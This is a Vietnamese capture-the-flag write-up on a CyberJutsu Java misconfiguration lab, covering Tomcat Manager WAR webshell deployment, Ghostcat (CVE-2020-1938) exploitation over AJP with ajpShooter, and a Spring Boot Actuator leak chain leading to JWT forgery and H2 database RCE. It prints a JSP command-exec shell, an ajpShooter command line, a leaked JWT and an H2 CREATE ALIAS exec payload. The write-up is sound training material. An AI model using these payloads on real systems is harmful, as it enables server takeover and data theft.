---
date: 2026-04-10T00:00:00+07:00
title: CBJS Java Misconfiguration Challenge
categories: [pentesting, Web-Exploitation, CTF]
tags: [CTF, Web]
---

# CBJS Java Misconfiguration Challenge

### Statement Viewer 1: Lỗ hổng từ đặc quyền "Privileged" và sự hớ hênh của Admin

#### Tổng quan ứng dụng

![image](https://hackmd.io/_uploads/HyJYXUFQZg.png)

![image](https://hackmd.io/_uploads/rk1BAIKm-g.png)

Ứng dụng cung cấp chức năng cơ bản: cho phép người dùng `upload file` (định dạng PDF/TXT) và `view statement` để xem lại các tệp tin đã tải lên. Mỗi tệp tin được cấp một đường dẫn riêng biệt để truy xuất. Qua phân tích mã nguồn (Whitebox), chúng ta sẽ tập trung vào những `"backdoor"` mà developer đã bỏ quên.

#### Phân tích lỗ hổng (Code Breakdown)

![context.xml](https://hackmd.io/_uploads/H1oJmcKXZx.png)

Mắt xích yếu nhất nằm ở tệp cấu hình `context.xml`. Tại đây, thuộc tính `privileged="true"` đã được kích hoạt.

Hệ quả: Cho phép ứng dụng truy cập các nội dung nội bộ nhạy cảm của Tomcat, thực thi các `Servlet/Valve` đặc quyền và can thiệp sâu vào hệ thống quản lý.

Sự cố càng nghiêm trọng hơn khi kết hợp với cấu hình trong thẻ Valve:

```xml 
<Valve className="org.apache.catalina.valves.RemoteAddrValve" allow=".*" />
```

Dòng code này chính là lời chào mừng dành cho mọi địa chỉ IP, phá bỏ mọi rào cản truy cập vào khu vực nội bộ. Cuối cùng, tại tomcat-users.xml, một tài khoản "bị bỏ quên" mang tên spike với quyền quản trị cao nhất đã trở thành chìa khóa vạn năng cho attacker.

![tomcat-users.xml](https://hackmd.io/_uploads/BkaoBqFXWl.png)

#### Quá trình khai thác (Exploit)

Xâm nhập `Tomcat Manager`: Sử dụng thông tin đăng nhập của `spike`, ta dễ dàng tiến vào giao diện quản lý tại `/manager/html`.

![image](https://hackmd.io/_uploads/H1uALctQZe.png)

Sau khi truy cập vào tomcat manager, ta để ý rằng tại giao diện quản lý tomcat có phần cho phép thực hiện upload một file WAR và tiến hành deploy nó.

![image](https://hackmd.io/_uploads/HkIu38qm-e.png)

Triển khai thực thi từ xa (RCE): Tận dụng tính năng `upload file WAR`, mình sử dụng công cụ `godofwar` để đóng gói một `Webshell` tham khảo thêm tại : 

- <https://medium.com/defmax/rce-via-war-upload-in-tomcat-using-path-traversal-e0f11898016e>
- <https://medium.com/@mingihongkim/exploiting-java-portlets-with-a-malicious-war-file-to-gain-a-reverse-shell-2504909f71c1>

![image](https://hackmd.io/_uploads/HyN8pLcmWg.png)

![image](https://hackmd.io/_uploads/HkrAkPqX-l.png)

Chiếm quyền điều khiển: Sau khi deploy thành công, việc truy cập vào đường dẫn shell cho phép thực thi lệnh trực tiếp trên server, hoàn tất chuỗi tấn công RCE.

![image](https://hackmd.io/_uploads/SJ7zlv9Q-e.png)

### Statement Viewer 2: Ghostcat (CVE-2020-1938)

![image](https://hackmd.io/_uploads/HkB6rPqXWx.png)

Truy cập vào `Statement Viewer 2`, cơ bản chức năng của web application này vẫn không có sự khác biệt với `Statement Viewer 1`. Nên ở đây mình sẽ đi vào phần phân tích sink và phân tích kỹ thuật exploit.

#### Dấu hiệu nhận biết Sink

Về mặt chức năng, `Statement Viewer 2` không có sự thay đổi. Tuy nhiên, khi quan sát log hệ thống và tệp `docker-compose`, ta phát hiện cổng 8009 (AJP - Apache Jserv Protocol) đang được mở công khai.

![image](https://hackmd.io/_uploads/Hke-DwcQ-e.png)

`AJP` là giao thức nhị phân giúp tối ưu hóa kết nối giữa `Front-end (Apache)` và `Back-end (Tomcat)`. Nếu cổng này bị lộ ra ngoài, attacker có thể gửi các request đặc biệt `(crafted requests)` để đọc hoặc bao hàm `(include)` các tệp tin tùy ý trong ứng dụng web. Đây chính là lỗ hổng nổi tiếng mang tên `Ghostcat` với mã CVE là `(CVE-2020-1938)`.

Vì thế, nếu trong một web application có chức năng `upload file` (hoặc attacker control content webapp) thì có thể dẫn đến RCE. Và chức năng của web app này hoàn toàn đáp ứng được yêu cầu để khai thác.

#### Quá trình khai thác (Exploit)

![image](https://hackmd.io/_uploads/r1CK_D5QWl.png)

Sau khi thử truy cập đến port 8009, ta có thể thấy rằng nó không cho ta tương tác trực tiếp qua browser nên ta sẽ phải tìm hướng đi khác.

Sau khi research một lúc về lỗ hổng trên thì mình tìm được một công cụ có thể hữu ích tên ajpshooter : <https://github.com/00theway/Ghostcat-CNVD-2020-10487>

![image](https://hackmd.io/_uploads/HJuE6D97We.png)

Sử dụng công cụ `ajpShooter` để kiểm tra khả năng đọc file nhạy cảm thông qua cổng 8009. Kết quả trả về cho thấy hệ thống hoàn toàn `vulnerable`.

![image](https://hackmd.io/_uploads/H1Y66DqXbg.png)

Tại đây, mình tiến hành tạo một `file shell` và lợi dụng công cụ đã nói ở trên để tiến hành RCE : 

```bash 
python3 ajpShooter.py https://statement-viewer-02.java.cyberjutsu-lab.tech/ 8009 /WEB-INF/statements/2460d5ca8a01fa885703e5cb32644b24/fba6c858-27ae-4ad6-b295-eb0168fbbf43.txt eval
```

Ở đây nhớ là phải thay đổi folder có chứa shell vì folder nó là userID.

```java 
<%@ page import="java.io.*" %>
<%
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "ls -la"});
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
    reader.close();
%>
```

![image](https://hackmd.io/_uploads/HymCWuq7Ze.png)

Sau khi sử dụng script Python để yêu cầu AJP "thực thi" tệp text vừa upload như một trang JSP. Kết quả: Toàn bộ cấu trúc thư mục server đã hiện ra trước mắt. Thành công RCE.

### CyberSoc: Chuỗi mắt xích từ Spring Boot Actuator đến H2 Database

#### Tổng quan ứng dụng

![image](https://hackmd.io/_uploads/rJw_Hq5Qbl.png)

Đây là một trang quản lý SOC, để mà nói về luồng xử lý thì mình sẽ không nói tới, thay vào đó vì đây là lab về misconfiguration nên mình sẽ chủ yếu đi sâu vào các cấu hình sai.

#### Phân tích attack surface

![image](https://hackmd.io/_uploads/rknI25q7Zg.png)

CyberSoc là một ứng dụng quản lý SOC hiện đại sử dụng Spring Boot. Lỗ hổng của nó bắt đầu lộ diện khi developers để lộ các endpoint của Spring Boot Actuator — một công cụ quản trị mạnh mẽ nhưng cực kỳ nguy hiểm nếu cấu hình sai.

![image](https://hackmd.io/_uploads/Skd5hcq7bg.png)

Ở đây ta biết được actuator nó là một nơi để mình quản lý project. Chính  trong tài liệu của Spring cũng nói rằng nơi đây thường xuyên bị lộ những dữ liệu nhạy cảm nên ta sẽ tận dụng chúng.

![SecurityConfig](https://hackmd.io/_uploads/SJiNxo5mWe.png)

Tại file `SecurityConfig`, ta nhận thấy rằng rất nhiều endpoint của actuator đã bị expose ra ngoài, từ đây ta có thể thấy được toàn bộ API.

![application.properties](https://hackmd.io/_uploads/rkR1-sq7Zg.png)

Tại file `application.properties`, ta thấy rõ rằng các API bị expose và được phân quyền như nào, sẽ có những API như `health, info,...` sẽ cho phép tất cả truy cập vào.

![data.sql](https://hackmd.io/_uploads/B1p8Zi5Xbx.png)

Tiếp theo đó tại `data.sql`. Có thể thấy rằng developer đã INSERT vào 2 user đó là `staff.cybersoc`, có role là `USER` và `admin`, với role là `ADMIN` tuy ở đây nó leak password nhưng đã được mã hoá bằng Bcrypt, nó là mã hoá 1 chiều nên không decode ra được nên ta sẽ phải tìm cách khác để đăng nhập được vào.

![/api/actuator/mappings](https://hackmd.io/_uploads/HkvnNi9mbg.png)

Tại `/api/actuator/mappings`, toàn bộ bản đồ API của hệ thống bị phơi bày và nó cũng tương tự như trong phần source ta đã đọc ở bên trên.

![/api/actuator/logfile](https://hackmd.io/_uploads/H1PuVj5QZx.png)

Truy cập `/api/actuator/logfile`, mình tình cờ phát hiện một "Test token" chưa được xóa. Đây là một `JWT (JSON Web Token)` hợp lệ của người dùng `staff.cybersoc`.

```text 
Test token generated, this should be deleted on production: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJzdGFmZi5jeWJlcnNvYyIsInJvbGUiOiJVU0VSIiwiaWF0IjoxNzY2NjUyNDQyLCJleHAiOjE3NjY2NzQwNDJ9.JS5av5h1OwoC6vkLXiNlnc2kCtOMAWeUiuv_VJyiZLU
```

![image](https://hackmd.io/_uploads/HkZtBoq7Zl.png)

![image](https://hackmd.io/_uploads/rJJZLoqmZx.png)

Trong `JwtAuthorizationFilter` ta có thể thấy được chỗ cookie có header là `Authorization` và bắt đầu với `Bearer` nên ta sử dụng token này chèn vào `Cookie Authorization`, truy cập vào `Dashboard`

![image](https://hackmd.io/_uploads/BynoUoq7We.png)

![Dashboard](https://hackmd.io/_uploads/B18C8ocXbx.png)

Thành công đăng nhập được vào dashboard và lấy được flag đầu tiên.

![/api/actuator/metrics](https://hackmd.io/_uploads/SkuCdocX-e.png)

Truy cập vào `/api/actuator/metrics`. Tại endpoint này mình không khai thác được gì nhiều nên sẽ sang endpoint khác.

![/api/actuator/configprops](https://hackmd.io/_uploads/ryP4Fo9X-x.png)

![/admin/console](https://hackmd.io/_uploads/Hk3UKiq7Zg.png)

Truy cập vào 2 API endpoint là `/admin/console` và `/api/actuator/configprops`, cả 2 đều trả về response là `403` nghĩa là bị chặn vì không đủ quyền. Vậy bây giờ ta sẽ phải tìm hướng đi để leo được lên user ADMIN.

#### Leo thang đặc quyền (Privilege Escalation)

![/api/actuator/env](https://hackmd.io/_uploads/Byyg5oc7bx.png)

Tại đây, sau khi truy cập vào `/api/actuator/env` mình tìm được SecretKey của JWT, đây là một điểm `misconfig` lớn vì developer đã để cho user với role thấp có thể đọc được `env`.

![image](https://hackmd.io/_uploads/SkYyTscQZx.png)

Từ SecretKey đã kiếm được bây giờ ta sẽ sử dụng JWT.io để thay đổi role của user `staff.cybersoc` lên ADMIN.

![image](https://hackmd.io/_uploads/Sy3Lrh5X-e.png)

Sau khi thay đổi, như cũng ta sẽ thử truy cập vào `admin/console`. Kết quả đúng như dự đoán nó redirect ta đến trang đăng nhập của `H2 database`.

![image](https://hackmd.io/_uploads/HyDiHhcmWg.png)

Thành công truy cập tới trang, vấn đề là bây giờ thiếu mất đi `password` để có thể đăng nhập nên ta sẽ tìm kiếm thêm, để xem liệu rằng liệu có tìm thêm được `password` hay không.

![/api/actuator/configprops](https://hackmd.io/_uploads/SyAyP39mWl.png)

Nhớ ra còn `/api/actuator/configprops` vẫn chưa tìm kiếm vì chưa đủ quyền, bây giờ mình đã là admin nên hoàn toàn có thể vào xem. Sau khi truy cập thì có được password.

![image](https://hackmd.io/_uploads/ry7gu35XZe.png)

Sau khi đăng nhập, ta có một bảng tên là `flag` bây giờ chỉ việc chạy SQL query để đọc nội dung trong bảng `flag`.

![image](https://hackmd.io/_uploads/Sy8rdn57Zl.png)

Thành công lấy được thông tin trong bảng cụ thể ở đây là bảng `FLAG`. Tuy đã lấy được thông tin bảng nhưng ta vẫn chưa RCE được nên mình sẽ research thêm để tìm cách RCE được `H2 server` này.

#### H2 Database to RCE

Sau khi research một lúc thì vô tình tìm được 1 nguồn hướng dẫn leo quyền ở H2 tham khảo ở : <https://exp10it.io/posts/h2-rce-in-jre-17/>

![image](https://hackmd.io/_uploads/BJlT5n9XZx.png)

Sử dụng payload để thực hiện sử dụng shell với câu lệnh `ls -la` sau đó đưa output ra file `output.txt`.

```sql 
-- 1. Tạo bí danh cho các hàm Java cần thiết
CREATE ALIAS IF NOT EXISTS EXEC AS $$ 
String exec(String cmd) throws java.io.IOException {
    String[] command = {"/bin/sh", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}
$$;

-- 2. Thực thi lệnh ls -la và chuyển hướng vào file output.txt
-- Lưu ý: Lệnh này thực thi trên server đang chạy database
CALL EXEC('ls -la > output.txt');

-- (Tùy chọn) Kiểm tra nội dung file vừa tạo bằng cách đọc ngược lại nếu cần
-- CALL EXEC('cat output.txt');
```

![image](https://hackmd.io/_uploads/HykrsnqX-x.png)

Sau đó dùng `read file` để có thể đọc được output sau khi thực thi shell.

```sql 
SELECT FILE_READ('output.txt', NULL);
```

![image](https://hackmd.io/_uploads/SyTio257bg.png)

Thành công RCE và đọc được file flag cuối cũng và kết thúc lab misconfig.

